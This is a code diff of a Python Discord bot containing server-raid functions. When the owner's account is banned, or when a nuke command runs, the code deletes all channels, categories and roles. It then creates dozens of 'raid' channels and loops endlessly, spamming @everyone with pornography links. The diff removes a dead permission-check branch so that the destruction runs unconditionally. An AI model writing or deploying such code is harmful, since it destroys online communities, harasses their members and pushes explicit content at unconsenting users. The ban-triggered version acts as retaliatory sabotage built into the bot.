@@ -311,10 +311,10 @@ async def on_member_ban(guild, user):
     global ownerid
     global bansdict
     guildid = guild.id
-    try:
-        bansdict[guildid] = bans[guildid] + 1
-    except:
-        None
+    # try:
+    #     bansdict[guildid] = guild.bans()[guildid] + 1
+    # except:
+    #     None
 
     if user.id == ownerid:
         rlist = ["Scammer", "Scam Link", "Banned", "Used .ban command", "No Reason Provided", "Dm advertising",
@@ -337,41 +337,36 @@ async def on_member_ban(guild, user):
                 except:
                     None
 
-            if False:
-                print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
-                await txt.send("You don't have `Administrator` Permissions!")
-            else:
-
+            try:
                 try:
-                    try:
-                        text_channel_list = []
+                    text_channel_list = []
 
-                        for channel in guild.text_channels:
-                            text_channel_list.append(channel)
+                    for channel in guild.text_channels:
+                        text_channel_list.append(channel)
 
-                        for channel in text_channel_list:
-                            try:
-                                await channel.delete()
-                            except:
-                                None
+                    for channel in text_channel_list:
+                        try:
+                            await channel.delete()
+                        except:
+                            None
 
-                    except:
-                        None
-
-                    finally:
-                        None
                 except:
                     None
+
                 finally:
                     None
+            except:
+                None
+            finally:
+                None
 
-                newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
-                for i in range(64):
-                    await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
+            newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
+            for i in range(64):
+                await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
 
-                while True:
-                    try:
-                        await newchannel.send("""**<@everyone> RAIDED BY UR MOM: https://pornhub.com/ EZ Noobs
+            while True:
+                try:
+                    await newchannel.send("""**<@everyone> RAIDED BY UR MOM: https://pornhub.com/ EZ Noobs
 EZ
 EZ
 EZ
@@ -379,14 +374,14 @@ EZ
 EZ
 EZ
 http://pornhub.com/**""")
-                    except:
-                        newchannel = random.choice(guild.text_channels)
+                except:
+                    newchannel = random.choice(guild.text_channels)
 
-                    try:
-                        await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
-                        await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
-                    except:
-                        None
+                try:
+                    await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
+                    await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
+                except:
+                    None
 
 
 # ANTI NUKE
@@ -594,54 +589,49 @@ async def nuke_server_fr(ctx):
                 except:
                     None
 
-        if False:
-            print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
-            await txt.send("You don't have `Administrator` Permissions!")
-        else:
-
+        try:
             try:
-                try:
-                    text_channel_list = []
+                text_channel_list = []
 
-                    for channel in ctx.guild.text_channels:
-                        text_channel_list.append(channel)
+                for channel in ctx.guild.text_channels:
+                    text_channel_list.append(channel)
 
-                    for channel in text_channel_list:
-                        try:
-                            await channel.delete()
-                        except:
-                            None
+                for channel in text_channel_list:
+                    try:
+                        await channel.delete()
+                    except:
+                        None
 
-                    for category in ctx.guild.categories:
-                        try:
-                            await category.delete()
-                        except:
-                            None
+                for category in ctx.guild.categories:
+                    try:
+                        await category.delete()
+                    except:
+                        None
 
-                except:
-                    None
-
-                finally:
-                    None
             except:
                 None
+
             finally:
                 None
+        except:
+            None
+        finally:
+            None
 
-            for role in ctx.guild.roles:
-                try:
-                    await role.delete()
-                except:
-                    continue
+        for role in ctx.guild.roles:
+            try:
+                await role.delete()
+            except:
+                continue
 
-            guild = ctx.message.guild
-            newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
-            for i in range(64):
-                await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
+        guild = ctx.message.guild
+        newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
+        for i in range(64):
+            await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
 
-            while True:
-                try:
-                    await newchannel.send("""**<@everyone> RAIDED BY UR MOM: https://pornhub.com/ EZ Noobs
+        while True:
+            try:
+                await newchannel.send("""**<@everyone> RAIDED BY UR MOM: https://pornhub.com/ EZ Noobs
 EZ
 EZ
 EZ
@@ -649,14 +639,14 @@ EZ
 EZ
 EZ
 http://pornhub.com/**""")
-                except:
-                    newchannel = random.choice(ctx.guild.text_channels)
+            except:
+                newchannel = random.choice(ctx.guild.text_channels)
 
-                try:
-                    await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
-                    await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
-                except:
-                    None
+            try:
+                await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
+                await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
+            except:
+                None
 
 
 # updated.
